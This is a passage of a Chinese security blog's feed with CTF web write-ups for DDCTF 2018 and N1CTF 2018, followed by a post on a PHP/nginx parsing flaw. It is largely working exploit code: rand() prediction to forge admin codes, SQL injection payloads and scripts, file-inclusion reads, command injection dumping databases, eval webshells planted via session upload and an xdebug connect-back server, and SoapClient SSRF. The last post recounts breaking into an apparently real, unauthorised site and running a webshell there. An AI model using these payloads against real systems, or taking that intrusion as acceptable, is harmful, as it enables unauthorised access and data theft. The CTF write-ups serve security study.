class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p><p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p><img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title=""><p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p><img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title=""><p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p><p>再分析下 <code>RAND_RANGE</code> 的构成</p><img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title=""><p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line"><span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line"><span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line"><span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">l[i] = m</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span></div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line"><span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line"> <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">min = <span class="number">0</span></div><div class="line">rnd_index = l[i]</div><div class="line">rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line"><span class="keyword">if</span> rnd_index != str_len:</div><div class="line">temp = org_str[str_len]</div><div class="line">org_str[str_len] = org_str[rnd_index]</div><div class="line">org_str[rnd_index] = temp</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">str_len -=<span class="number">1</span></div><div class="line">i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure><p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p><p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p><p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf 2018 web writeup</title>
    <link href="https://winter3un.github.io/2018/03/19/2018-n1ctf/"/>
    <id>https://winter3un.github.io/2018/03/19/2018-n1ctf/</id>
    <published>2018-03-19T11:20:26.000Z</published>
    <updated>2018-03-19T11:23:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p><a id="more"></a><h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p><p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line"></div><div class="line">$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">var_dump($q);</div><div class="line"><span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure><p>很明显，注入点在于points这个参数。</p><p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p><p>构建数据库语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">create database ctf_test；</div><div class="line">use ctf_test;</div><div class="line">create table user (id int,name text,points int);</div></pre></td></tr></table></figure></p><p>构造update查询的注入 payload 。</p><p>查询数据库当前用户信息，发送<code>flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)</code>生成查询语句，<code>UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)</code>，发现竟然没有被waf挡住。。。</p><p>查询当前用户表中用户密码，发送<code>flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)</code>，生成查询语语句 <code>UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)</code>，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~</p><h2 id="77777-2"><a href="#77777-2" class="headerlink" title="77777-2"></a>77777-2</h2><p>emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。</p><p><code>flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10)</code></p><p>没错。。pw左右各一个空格就绕过了，玄学。。</p><p>后台生成查询语句为<code>UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10)</code> 应该是非预期，话说正解到底是啥？</p><h2 id="funning-eating-cms"><a href="#funning-eating-cms" class="headerlink" title="funning eating cms"></a>funning eating cms</h2><p>一个cms系统。。用了网上的模版。</p><p><code>index.php</code>页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势<a href="http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config" target="_blank" rel="external">http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config</a></p><p>把看到的php文件都下载到本地，审计一波，发现<code>function.php</code>文件内<code>parse_url</code>函数存在绕过，当构造<code>////x.php?key=value</code>这种形式的uri的时候，parse_url函数将无法解析该uri。</p><p>之后在<a href="http://47.52.152.93:20000/templates/info.html" target="_blank" rel="external">http://47.52.152.93:20000/templates/info.html</a> 的源码里得知关键信息在<code>ffffllllaaaaggg.php</code>文件里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</div><div class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</div><div class="line">parse_str($uri[&apos;query&apos;], $query);</div></pre></td></tr></table></figure><p>通过构造 <a href="http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" target="_blank" rel="external">http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</a>  即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。</p><p><code>mysqldump -uroot -pNu1LCTF2018\!@#qwe --all-databases &gt; flagggggggg.png</code> (对不起，我就是这么暴力。。。</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>两个非预期解法。</p><p>第一个是通过包含session文件，利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制session内容，成功达成命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt;</div><div class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>第二个是通过xdebug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1</div></pre></td></tr></table></figure><p>exp 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line">php_code = <span class="string">b"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)"</span></div><div class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</div><div class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</div><div class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">global</span> count</div><div class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            msg = self.request.recv(<span class="number">8192</span>)</div><div class="line">            print(msg)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                self.request.send(payload)</div><div class="line">            count += <span class="number">1</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</div><div class="line">    serv.serve_forever()</div></pre></td></tr></table></figure><h2 id="harder-php"><a href="#harder-php" class="headerlink" title="harder php"></a>harder php</h2><p>之后出题人修复了非预期的解法，正常解法流程如下。</p><p>1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。</p><p>2、利用该sql注入漏洞，获取管理员密码。</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`,0x12345)%23</div></pre></td></tr></table></figure></p><p>3、管理员登录需要本地IP<code>127.0.0.1</code> ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（<a href="https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）" target="_blank" rel="external">https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.youtube.com/watch?v=5AdVQzUB6iM</div><div class="line">SSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125;</div></pre></td></tr></table></figure></p><p>4、其user-agent参数可以CRLF注入，伪造<code>http request</code>头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。</p><p>5、利用管理员登录后的session，上传php文件，但是有个坑，<code>stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0</code> 这个表达式是恒返回0的。也就是说，不管怎么样都会触发<code>rm /app/*</code></p><p>6、通过搜索引擎查询<code>rm * 无法删除文件</code>，查询到，当文件名前缀为<code>-x</code>时，必须用 <code>rm -- *</code> 才能删除，故上传文件名为<code>-x1234</code>的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell</p><h2 id="baby-sqli"><a href="#baby-sqli" class="headerlink" title="baby sqli"></a>baby sqli</h2><p>题目太坑，注入点在个签那里，条件判断在头像那边。。</p><p>当时没做出，给个官方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*- </div><div class="line">import requests</div><div class="line">from random import Random</div><div class="line">def random_str(randomlength=8):</div><div class="line">    str = &apos;&apos;</div><div class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line">    length = len(chars) - 1</div><div class="line">    random = Random()</div><div class="line">    for i in range(randomlength):</div><div class="line">        str+=chars[random.randint(0, length)]</div><div class="line">    return str</div><div class="line">dic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">table_name=&apos;&apos;</div><div class="line">def register(email,uinfo):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">data=&#123;</div><div class="line">&quot;email&quot;:email,</div><div class="line">&quot;pass&quot;:&quot;123&quot;,</div><div class="line">&quot;userinfo&quot;:userinfo</div><div class="line">&#125;</div><div class="line">requests.post(url=url,data=data)</div><div class="line">def login(loginuser):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/login.php&quot;</div><div class="line">a=requests.session()</div><div class="line">data2=&#123;</div><div class="line">&quot;loginuser&quot;:loginuser,</div><div class="line">&quot;loginpass&quot;:&quot;123&quot;</div><div class="line">&#125;</div><div class="line">a.post(url=url,data=data2)</div><div class="line">url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot;</div><div class="line">b=a.get(url3)</div><div class="line">return b.text</div><div class="line">for i in range(1,100):</div><div class="line">for j in dic:</div><div class="line">email=random_str(randomlength=8)+&quot;@1.com&quot;</div><div class="line">userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j)</div><div class="line">register(email,userinfo)</div><div class="line">c=login(email)</div><div class="line">if &quot;1.png&quot; in c:</div><div class="line">table_name += j</div><div class="line">print table_name</div><div class="line">break</div><div class="line">print table_name</div></pre></td></tr></table></figure><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="http://netsecurity.51cto.com/art/201702/531607.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201702/531607.htm</a>    一种新的MySQL下Update、Insert注入方法</p><p><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="external">https://www.anquanke.com/post/id/84837</a>   题目2 无人机病了（Web）</p><p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="external">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a>   PHP Xdebug 远程调试命令执行分析</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>低版本php+nginx 解析漏洞</title>
    <link href="https://winter3un.github.io/2018/02/20/2018-2-21/"/>
    <id>https://winter3un.github.io/2018/02/20/2018-2-21/</id>
    <published>2018-02-21T07:20:42.000Z</published>
    <updated>2018-02-21T07:27:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p><a id="more"></a><img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title=""><p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p><p><strong>下图来自wooyun</strong></p><img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title=""><p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p><p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p><img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title=""><img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title=""><p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p><p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p><img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title=""><p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p><p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p><p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p><p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p><p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p><p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>]]></content>
    
    <summary type="html">
    
